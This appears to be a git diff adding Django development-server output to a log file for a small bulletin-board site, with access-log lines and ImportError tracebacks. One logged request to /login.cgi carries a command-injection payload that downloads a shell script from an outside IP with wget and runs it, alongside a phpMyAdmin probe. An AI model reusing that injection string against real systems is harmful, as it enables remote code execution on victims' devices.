@@ -485,3 +485,267 @@ Traceback (most recent call last):
 TabError: inconsistent use of tabs and spaces in indentation
 Performing system checks...
 
+[06/Sep/2018 13:36:47] "GET /board/page/1 HTTP/1.1" 200 3296
+[06/Sep/2018 13:36:47] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[06/Sep/2018 13:36:47] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:37:39] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:37:41] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:37:41] "GET /static/css/bootstrap/3.3.2/css/bootstrap-theme.min.css HTTP/1.1" 200 19963
+[06/Sep/2018 13:37:41] "GET /static/css/board.css?ver=1 HTTP/1.1" 200 943
+[06/Sep/2018 13:37:41] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+[06/Sep/2018 13:37:42] "GET /static/css/bootstrap/3.3.2/css/bootstrap.min.css HTTP/1.1" 200 117150
+[06/Sep/2018 13:37:42] "GET /static/css/bootstrap/3.3.2/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[06/Sep/2018 13:37:45] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:37:46] "GET /static/css/board.css?ver=1 HTTP/1.1" 200 943
+[06/Sep/2018 13:37:46] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+[06/Sep/2018 13:37:46] "GET /static/css/bootstrap/3.3.2/css/bootstrap-theme.min.css HTTP/1.1" 200 19963
+[06/Sep/2018 13:37:46] "GET /static/css/bootstrap/3.3.2/css/bootstrap.min.css HTTP/1.1" 200 117150
+[06/Sep/2018 13:37:47] "GET /static/css/bootstrap/3.3.2/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[06/Sep/2018 13:37:49] "GET /board/page/1 HTTP/1.1" 200 3296
+[06/Sep/2018 13:37:51] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:39:13] "GET /board/32 HTTP/1.1" 301 0
+[06/Sep/2018 13:39:14] "GET /board/32/ HTTP/1.1" 200 2256
+[06/Sep/2018 13:39:23] "GET /board/page/1 HTTP/1.1" 200 3296
+[06/Sep/2018 13:39:27] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:50:13] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 13:50:13] "GET /static/css/bootstrap/3.3.2/css/bootstrap-theme.min.css HTTP/1.1" 200 19963
+[06/Sep/2018 13:50:13] "GET /static/css/board.css?ver=1 HTTP/1.1" 200 943
+[06/Sep/2018 13:50:13] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+[06/Sep/2018 13:50:13] "GET /static/css/bootstrap/3.3.2/css/bootstrap.min.css HTTP/1.1" 200 117150
+[06/Sep/2018 13:50:14] "GET /static/css/bootstrap/3.3.2/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[06/Sep/2018 13:50:19] "GET /signup/ HTTP/1.1" 200 1913
+[06/Sep/2018 13:50:26] "GET /signup/ HTTP/1.1" 200 1913
+[06/Sep/2018 14:12:21] "GET /board/page/1 HTTP/1.1" 200 3296
+[06/Sep/2018 14:12:23] "GET /signup/ HTTP/1.1" 200 1913
+[06/Sep/2018 14:12:53] "POST /signup/ HTTP/1.1" 302 0
+[06/Sep/2018 14:12:53] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 14:51:16] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 14:51:16] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+Not Found: /phpmyadmin/scripts/setup.php
+[06/Sep/2018 15:22:32] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 4123
+[06/Sep/2018 15:44:21] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 16:59:42] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[06/Sep/2018 16:59:49] "GET /signup/ HTTP/1.1" 200 1913
+[06/Sep/2018 17:00:24] "POST /signup/ HTTP/1.1" 302 0
+[06/Sep/2018 17:00:24] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 17:00:28] "GET /signin/ HTTP/1.1" 200 1665
+[06/Sep/2018 17:00:41] "POST /signin/ HTTP/1.1" 302 0
+[06/Sep/2018 17:00:41] "GET / HTTP/1.1" 200 3579
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[06/Sep/2018 17:13:46] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1738
+[06/Sep/2018 17:52:57] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 17:58:00] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 17:58:00] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 17:58:00] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 19:17:44] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 19:17:44] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+Not Found: /login.cgi
+[06/Sep/2018 19:32:14] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 4164
+[06/Sep/2018 19:38:32] "GET / HTTP/1.1" 200 3600
+Not Found: /graphs/
+[06/Sep/2018 19:43:14] "GET /graphs/ HTTP/1.1" 404 4060
+[06/Sep/2018 21:07:27] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 21:07:28] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[06/Sep/2018 21:07:31] "GET /board/page/1 HTTP/1.1" 200 3296
+[06/Sep/2018 21:07:32] "GET /board/page/2 HTTP/1.1" 200 3472
+[06/Sep/2018 21:07:33] "GET /board/page/3 HTTP/1.1" 200 3472
+[06/Sep/2018 21:07:33] "GET /board/page/3 HTTP/1.1" 200 3472
+[06/Sep/2018 21:07:33] "GET /board/page/4 HTTP/1.1" 200 3467
+[06/Sep/2018 21:07:34] "GET /board/page/5 HTTP/1.1" 200 3532
+[06/Sep/2018 21:07:35] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 21:53:03] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 21:53:03] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[06/Sep/2018 21:53:04] "GET /board/page/1 HTTP/1.1" 200 3309
+[06/Sep/2018 21:53:07] "GET /board/page/1 HTTP/1.1" 200 3309
+[06/Sep/2018 21:53:08] "GET / HTTP/1.1" 200 3600
+[06/Sep/2018 21:53:08] "GET /board/page/1 HTTP/1.1" 200 3309
+[06/Sep/2018 21:53:09] "GET /board/page/1 HTTP/1.1" 200 3309
+[06/Sep/2018 21:54:15] "GET /board/page/1 HTTP/1.1" 200 3339
+[06/Sep/2018 21:54:16] "GET /board/page/1 HTTP/1.1" 200 3339
+[06/Sep/2018 21:54:17] "GET /board/page/1 HTTP/1.1" 200 3339
+[06/Sep/2018 21:54:18] "GET /board/page/1 HTTP/1.1" 200 3339
+[06/Sep/2018 21:55:03] "GET /board/page/1 HTTP/1.1" 200 3344
+[06/Sep/2018 21:55:04] "GET /board/page/1 HTTP/1.1" 200 3344
+[06/Sep/2018 21:55:04] "GET /board/page/1 HTTP/1.1" 200 3344
+[06/Sep/2018 21:55:04] "GET /board/page/1 HTTP/1.1" 200 3344
+[06/Sep/2018 21:56:29] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:29] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:30] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:30] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:30] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:30] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:30] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:56:31] "GET /board/page/1 HTTP/1.1" 200 3345
+[06/Sep/2018 21:57:24] "GET /board/page/1 HTTP/1.1" 200 3365
+[06/Sep/2018 21:57:25] "GET /board/page/1 HTTP/1.1" 200 3365
+[06/Sep/2018 21:57:25] "GET /board/page/1 HTTP/1.1" 200 3365
+[06/Sep/2018 21:57:25] "GET /board/page/1 HTTP/1.1" 200 3365
+[06/Sep/2018 21:57:26] "GET /board/page/1 HTTP/1.1" 200 3365
+[06/Sep/2018 21:57:42] "GET /board/page/1 HTTP/1.1" 200 3376
+[06/Sep/2018 21:57:43] "GET /board/page/1 HTTP/1.1" 200 3376
+[06/Sep/2018 21:57:43] "GET /board/page/1 HTTP/1.1" 200 3376
+[06/Sep/2018 21:57:57] "GET /board/page/1 HTTP/1.1" 200 3376
+[06/Sep/2018 21:59:10] "GET /board/page/1 HTTP/1.1" 200 3297
+[06/Sep/2018 21:59:11] "GET /board/page/1 HTTP/1.1" 200 3297
+[06/Sep/2018 22:00:01] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:01] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 200 967
+[06/Sep/2018 22:00:01] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:02] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:02] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:02] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:03] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:00:03] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:06] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:06] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:08] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:00:08] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:37] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:37] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 200 943
+[06/Sep/2018 22:00:38] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:00:38] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:00:39] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:00:39] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:36:24] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:24] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:36:24] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:25] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:26] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:27] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:28] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:28] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:28] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:29] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:29] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:30] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:30] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:30] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:31] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:31] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:31] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:32] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:32] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:33] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:33] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:33] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:34] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:36:34] "GET / HTTP/1.1" 200 3602
+[06/Sep/2018 22:36:34] "GET /board/page/1 HTTP/1.1" 200 3299
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 06, 2018 - 13:36:38
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+True
+Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f42158786a8>
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
+    include_deployment_checks=include_deployment_checks,
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
+    return checks.run_checks(**kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
+    new_errors = check(app_configs=app_configs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
+    all_namespaces = _load_all_namespaces(resolver)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
+    url_patterns = getattr(resolver, 'url_patterns', [])
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/mysite/urls.py", line 24, in <module>
+    path('', include('board.urls')),
+  File "/usr/local/lib/python3.7/site-packages/django/urls/conf.py", line 34, in include
+    urlconf_module = import_module(urlconf_module)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/board/urls.py", line 3, in <module>
+    from . import views
+  File "/python/mysite/board/views.py", line 8, in <module>
+    from .forms import BoardForm, UserSignupForm, UserSigninForm, CommentForm
+ImportError: cannot import name 'UserSignupForm' from 'board.forms' (/python/mysite/board/forms.py)
+Performing system checks...
+
+Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f2a94b106a8>
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
+    include_deployment_checks=include_deployment_checks,
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
+    return checks.run_checks(**kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
+    new_errors = check(app_configs=app_configs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
+    all_namespaces = _load_all_namespaces(resolver)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
+    url_patterns = getattr(resolver, 'url_patterns', [])
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/mysite/urls.py", line 24, in <module>
+    path('', include('board.urls')),
+  File "/usr/local/lib/python3.7/site-packages/django/urls/conf.py", line 34, in include
+    urlconf_module = import_module(urlconf_module)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/board/urls.py", line 3, in <module>
+    from . import views
+  File "/python/mysite/board/views.py", line 8, in <module>
+    from .forms import BoardForm, UserSignupForm, UserSigninForm, CommentForm
+ImportError: cannot import name 'UserSignupForm' from 'board.forms' (/python/mysite/board/forms.py)
+Performing system checks...
+
+[06/Sep/2018 22:40:01] "GET /board/page/1 HTTP/1.1" 200 3299
+[06/Sep/2018 22:40:01] "GET /static/css/board.css?ver=1.1 HTTP/1.1" 304 0
+[06/Sep/2018 22:40:02] "GET /signin/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:40:04] "GET /signup/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:40:06] "GET /signin/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:40:06] "GET /signup/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:41:04] "GET /signup/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:41:05] "GET /signup/ HTTP/1.1" 200 1915
+[06/Sep/2018 22:41:06] "GET /signup/ HTTP/1.1" 200 1915
